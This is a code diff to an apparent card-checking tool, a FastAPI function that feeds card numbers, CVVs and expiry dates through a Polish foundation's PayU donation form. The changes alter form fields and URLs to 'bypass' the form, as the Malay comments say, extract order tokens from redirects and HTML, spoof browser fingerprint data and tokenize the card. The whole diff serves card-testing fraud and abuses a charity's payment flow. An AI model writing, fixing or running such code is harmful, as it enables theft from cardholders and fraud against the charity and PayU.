@@ -6,6 +6,7 @@ import time
 import random
 import string
 import requests
+from urllib.parse import unquote
 
 app = FastAPI()
 
@@ -87,14 +88,14 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create order via fundacjasueryder.pl ───
+        # ─── Step 1: Trigger Order via fundacjasueryder.pl ───
         headers1 = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://fundacjasueryder.pl',
-            'referer': 'https://fundacjasueryder.pl/en/',
+            'referer': 'https://fundacjasueryder.pl/en/payu/', # Rujukan dari halaman borang
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -107,50 +108,53 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         }
 
         data1 = {
-            'amount': '5',
-            'description': 'Donation',
-            'email': email,
-            'firstname': name.split()[0],
-            'lastname': name.split()[1],
+            'payu_amount': '5', # Selalunya nama field berbeza untuk bypass form
+            'payu_description': 'Donation',
+            'payu_email': email,
+            'payu_firstname': name.split()[0],
+            'payu_lastname': name.split()[1],
+            'payu_submit': 'Zapłać', # Simulasikan klik butang submit
         }
 
-        # DITUKAR: allow_redirects=True supaya ikut ke mana laman web tu hantar
-        r1 = session.post('https://fundacjasueryder.pl/en/payu/', headers=headers1, data=data1, allow_redirects=True, timeout=30)
+        # GUNA URL TANPA SLASH DI HUJUNG UNTUK BYPASS BORANG
+        r1 = session.post('https://fundacjasueryder.pl/payu', headers=headers1, data=data1, allow_redirects=True, timeout=30)
 
         order_id = None
         token = None
 
-        # Cuba cari dalam URL terakhir yang dilawati
-        final_url = r1.url
-        oid = re.search(r'orderId=([^&]+)', str(final_url))
-        tok = re.search(r'token=([^&]+)', str(final_url))
-        if oid:
-            order_id = oid.group(1)
-        if tok:
-            token = tok.group(1)
+        # 1. Cuba cari dalam URL terakhir
+        final_url = str(r1.url)
+        oid = re.search(r'orderId=([^&]+)', final_url)
+        tok = re.search(r'token=([^&]+)', final_url)
+        if oid: order_id = oid.group(1)
+        if tok: token = tok.group(1)
 
-        # Kalau tak jumpa dalam URL, cuba cari dalam isi kandungan HTML
+        # 2. Cuba cari dalam URL yang di-redirect sebelum ni (jika ada dalam history)
+        if not order_id or not token:
+            for hist in r1.history:
+                hist_url = str(hist.url)
+                oid = re.search(r'orderId=([^&]+)', hist_url)
+                tok = re.search(r'token=([^&]+)', hist_url)
+                if oid and not order_id: order_id = oid.group(1)
+                if tok and not token: token = tok.group(1)
+
+        # 3. Cuba cari dalam isi HTML (kadang-kadang di hidden dalam JavaScript)
         if not order_id or not token:
             body = r1.text
             oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
             tok = re.search(r'token["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
-            if oid and not order_id:
-                order_id = oid.group(1)
-            if tok and not token:
-                token = tok.group(1)
+            if oid and not order_id: order_id = oid.group(1)
+            if tok and not token: token = tok.group(1)
 
         if not order_id or not token:
-            return 'Failed to extract orderId or token', {"error": "Could not parse order", "final_url": str(final_url), "body_snippet": r1.text[:500]}
+            return 'Failed to extract orderId or token', {"error": "Could not parse order", "final_url": final_url, "body_snippet": r1.text[:800]}
 
         # ─── Step 2: Load PayU pay page ───
-        params2 = {
-            'orderId': order_id,
-            'token': token,
-        }
+        params2 = {'orderId': order_id, 'token': token}
 
         headers2 = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
             'referer': 'https://fundacjasueryder.pl/',
@@ -167,26 +171,22 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
         
-        # Auto-Reader untuk dapat exact amount & currency
-        final_amount = 500 # Default 5.00 PLN
+        final_amount = 500 
         final_currency = 'PLN'
         
         try:
             html_content = page_resp.text
             amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', html_content)
             curr_match = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', html_content)
-            
-            if amt_match:
-                final_amount = int(amt_match.group(1))
-            if curr_match:
-                final_currency = curr_match.group(1)
+            if amt_match: final_amount = int(amt_match.group(1))
+            if curr_match: final_currency = curr_match.group(1)
         except:
             pass
 
         # ─── Step 3: Tokenize card ───
         headers3 = {
             'accept': '*/*',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'authorization': f'Bearer {token}',
             'content-type': 'application/json',
             'origin': 'https://secure.payu.com',
@@ -246,9 +246,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                     'maskedCardNumber': masked,
                 },
             },
-            'metadata': {
-                'cardInputTime': 9039,
-            },
+            'metadata': {'cardInputTime': 9039},
             'browserData': {
                 'screenWidth': 800,
                 'javaEnabled': False,
@@ -256,7 +254,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 'screenHeight': 1280,
                 'userAgent': ua,
                 'colorDepth': 24,
-                'language': 'en-IN',
+                'language': 'en-US',
                 'challengeWindowSize': '04',
             },
             'language': 'en',
